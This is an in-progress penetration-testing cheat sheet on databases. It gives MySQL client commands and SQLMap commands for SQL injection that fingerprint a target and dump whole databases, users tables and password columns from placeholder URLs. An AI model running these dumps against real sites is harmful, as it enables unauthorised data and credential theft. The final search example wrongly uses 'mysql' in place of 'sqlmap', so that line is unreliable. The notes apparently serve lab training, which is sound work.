---
description: >-
  Databases vary widely, each requiring specific commands, tools, and syntax.
  This chapter provides guidance on navigating these differences.
---

# Databases

<mark style="color:red;background-color:yellow;">This chapter is in-progress.</mark>

<mark style="color:blue;">Check the index on the right to navigate this page more easily.</mark>

## Database Management Systems

### MySQL

Connect to a MySQL server

```bash
# Local service
mysql -u acuity -pSuperStr00ng!

# Remote service
mysql -u acuity -p -h <IP> -P 3306
```

List all databases

```sql
show databases;
```

Select a database

```sql
use name_of_database;
```

List all tables in the active database

```sql
show tables;
```

List content of a table

```sql
# List all content
select * from name_of_table;

# Define a more specific selection
select username, password from users where username = 'HTB';
```

### Microsoft SQL

### PostgreSQL



## Tools

### SQLMap

An open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. [https://sqlmap.org/](https://sqlmap.org/)

#### Basic Data Enumeration

```bash
# Check version, user, db name and admin permissions
sqlmap -u "http://www.acuity.lab/?id=1" --banner --current-user --current-db --is-dba
```

#### Table Enumeration

```bash
# Dump everything from MySQL server (no system databases) and require no user input
sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs --batch

# Dump everything from a specific database
sqlmap -u "http://www.example.com/?id=1" -D database --dump

# Enumerate all tables within the specified DB
sqlmap -u "http://www.example.com/?id=1" --tables -D database

# Dump all data from the specified table
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D database

# Dump only specific columns from specified table
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D database -C name,password

# Limit rows dumped by ordinal numbers
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D database --start=2 --stop=3

# Dump data based on matched conditions
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D database --where="name = 'acuity'"

# alternative
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D database --where="name LIKE 'acu%'"
```

#### Search for columns, tables or databases

Switch `--search` needs to be used in conjunction with one of the following support options:

* `-C` following a list of comma-separated column names to look for across the whole database management system.
* `-T` following a list of comma-separated table names to look for across the whole database management system.
* `-D` following a list of comma-separated database names to look for across the database management system.

Example:

```bash
# Search for tables containg "cred" in their name across DBMS
mysql -u "http://www.example.com/?id=1" --search -T cred
```
